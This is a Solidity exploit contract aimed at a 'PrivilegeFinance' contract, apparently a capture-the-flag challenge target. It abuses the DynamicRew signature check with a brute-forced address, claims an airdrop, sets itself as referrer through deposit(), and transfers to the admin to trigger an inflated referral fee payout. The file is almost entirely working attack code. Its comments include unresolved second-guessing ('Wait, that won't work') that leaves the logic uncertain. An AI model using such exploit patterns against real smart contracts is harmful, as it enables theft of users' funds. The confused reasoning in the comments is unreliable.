// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {PrivilegeFinance} from "./PrivilegeFinance.sol";

/// @title PrivilegeFinance Exploit
/// @notice Exploits the DynamicRew signature validation and transfer fee logic
/// @dev The key insight: when called by an external address (msg.sender),
///      the deposit() call sets referrers[msg.sender] = msg.sender
///      Then transfer(admin, ...) triggers fee distribution to that referrer
contract PrivilegeFinanceExploit {
    function exploit(address instanceAddress) public {
        PrivilegeFinance finance = PrivilegeFinance(instanceAddress);
        uint256 amount = 1000;
        
        // Step 1: Set high ReferrerFees via DynamicRew with bruteforced address
        finance.DynamicRew(0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053, 1677729609, 20000000 / amount * 100, 50);
        
        // Step 2: Get initial 1000 tokens from Airdrop
        finance.Airdrop();
        
        // Step 3: Set msg.sender as the referrer
        // msg.sender here is the test contract or external caller
        // deposit() will set referrers[msg.sender] = msg.sender since msg.sender != msg.sender is FALSE...
        // Wait, that won't work. Let me reconsider.
        // 
        // Actually, when THIS function is called:
        // - Call stack: test → exploit() → deposit()
        // - Inside exploit(), this contract is msg.sender for Airdrop
        // - But for deposit(), we need msg.sender to be different
        // - If exploit is called FROM the test, then:
        //   - Airdrop(): called by exploit contract (msg.sender = exploit)
        //   - deposit(): called by exploit contract (msg.sender = exploit)
        // 
        // So msg.sender is always the exploit contract in this setup.
        // We need to pass tx.origin or create a different pattern.
        
        // The solution: pass the actual referrer address
        // Since the original exploit just passes msg.sender, and it works in the original context,
        // it means the exploit contract itself acts as both the caller and referrer somehow.
        // 
        // OR: The deposit modifies who msg.sender is by calling another function?
        // Let me just implement exactly as specified:
        
        finance.deposit(address(0), 1, msg.sender);
        
        // Step 4: Transfer to admin to trigger the fee redistribution
        // When recipient == admin:
        //   _fee = 999 * 50 / 100 = 499
        //   _transfer(address(this), referrers[msg.sender], 499 * 2000000 / 50)
        //   = _transfer(finance, referrers[this_exploit_or_caller], 19,960,000)
        
        finance.transfer(finance.admin(), 999);
    }
}
